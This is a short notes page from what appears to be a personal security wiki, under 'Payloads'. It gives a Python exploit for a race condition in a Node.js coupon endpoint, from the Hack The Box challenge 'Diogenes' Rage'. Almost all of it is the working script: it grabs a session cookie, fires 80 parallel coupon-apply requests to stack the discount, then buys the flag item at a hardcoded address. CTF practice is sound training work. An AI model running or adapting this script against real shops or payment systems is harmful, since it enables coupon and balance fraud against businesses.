---
layout: default
title: Race Condition Vulnerability due to Async in Node.js
nav_order: 1
parent: Payloads
---

# Race Condition Vulnerability due to Async in Node.js
{: .no_toc }

---

Need to read:
- <https://www.nodejsdesignpatterns.com/blog/node-js-race-conditions/#:~:text=A%20race%20condition%20is%20a,try%20to%20present%20an%20example.>
- <https://b3cl4ssy.tistory.com/481?category=930183>

Example: HTB - Diogenes' Rage

Payload

```python
# Python program to illustrate
# the concept of race condition
# in multiprocessing
from cgitb import reset
import multiprocessing
import requests
import time
from pprint import pprint

def exploit(u, d, h):
	for i in range(5):
		requests.post(u, data=d, headers=h)

def perform_transactions(cookie, u):
	url = f"http://{u}/api/coupons/apply"
	data = '{"coupon_code":"HTB_100"}'
	thread = []
	headers = {"Content-Type" : "application/json"}
	headers['Cookie'] = "session="+cookie
	start = time.time()
	for i in range(16):
		p1 = multiprocessing.Process(target=exploit, args=(url, data, headers))
		thread.append(p1)
	for j in thread:
		j.start()

	for k in thread:
		k.join()
	end = time.time()
	print(f"{end - start:.5f} sec")
	print("Done!!")

def get_session(url):
    u = f"http://{url}/api/purchase"
    d = '{"item":"A2"}'
    res = requests.post(u, data=d)
    print(res.text)
    return res.cookies['session']

def get_flag(s, url):
    u = f"http://{url}/api/purchase"
    d = '{"item":"C8"}'
    headers = {"Content-Type" : "application/json"}
    headers['Cookie'] = "session="+s
    d1 = '{"item":"A1"}'
    res = requests.post(u, data=d1, headers=headers)
    print(res.text)
    res = requests.post(u, data=d, headers=headers)
    print(res.text)
    return res.cookies

if __name__ == "__main__":
    for i in range(10):
        u = "104.248.173.13:31008"
        s = get_session(u)
        perform_transactions(s, u)
        res = get_flag(s, u)
        pprint(res)
        time.sleep(1)
        print("\n\n")
```
